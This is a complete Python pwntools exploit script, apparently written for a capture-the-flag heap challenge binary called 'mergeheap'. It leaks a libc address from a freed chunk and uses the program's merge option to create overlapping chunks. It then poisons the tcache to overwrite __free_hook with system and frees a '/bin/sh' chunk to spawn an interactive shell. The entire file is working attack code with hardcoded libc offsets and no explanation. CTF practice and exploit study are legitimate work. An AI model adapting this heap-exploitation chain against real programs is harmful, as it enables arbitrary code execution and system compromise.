from pwn import *
context.log_level = 'debug'

def ru(data):
    p.recvuntil(data)


def sl(data):
    p.sendline(data);


def sd(data):
    p.send(data)

def rv():
    p.recv()

def add(size,data):
    ru(">>")
    sl("1")
    rv()
    sl(str(size))
    rv()
    sl(data)
    

def show(idx):
    ru(">>")
    sl("2")
    rv()
    sl(str(idx))


def dele(idx):
    ru(">>")
    sl("3")
    rv()
    sl(str(idx))


def merge(idx1, idx2):
    ru(">>")
    sl("4")
    rv()
    sl(str(idx1))
    rv()
    sl(str(idx2))


p=process('./mergeheap')
for i in range(7):
    add(0xf0,"a")

add(0xf0,"a"*8)
add(0x10,"a") #8
for i in range(7):
    dele(i)

dele(7)

add(0x8,"a"*8)#0
show(0)  
p.recvuntil("aaaaaaaa")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc_base = leak_addr - 0x7ffff7dcfd90 + 0x7ffff79e4000

#1
add(0xd0,"empty")
#overlapping
# 2
add(0x18,"A"*0x18) 
# 3
add(0x10,"\xa1"*0x10)

#4 
add(0x20,"a")
#5 
add(0x60,"a")
#6
add(0x20, "a")
#7
add(0x30,"0x30")

#  modify the size of 5th
dele(4)
merge(2,3)

dele(5)
free_hook_addr = libc_base - 0x7ffff79e4000 + 0x7ffff7dd18e8
payload = "a"*0x60 + p64(0) + p64(0x31) +p64(free_hook_addr)
system_addr = libc_base - 0x7ffff79e4000 + 0x7ffff7a33440
# overlap done
#tcache attack
dele(6)
add(0x90,payload)


add(0x20,"/bin/sh")
add(0x20,p64(system_addr))
dele(6)
p.interactive()

